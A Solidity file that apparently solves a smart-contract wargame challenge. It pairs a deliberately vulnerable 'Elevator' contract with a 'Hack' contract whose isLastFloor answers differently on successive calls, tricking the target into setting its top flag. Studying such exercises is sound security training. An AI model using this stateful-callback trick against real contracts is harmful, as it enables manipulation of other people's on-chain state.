// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack {
    Elevator private immutable elevator;
    uint256 private count;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    function attack() external {
        elevator.goTo(1);
        require(elevator.top(), "Is not the top floor");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
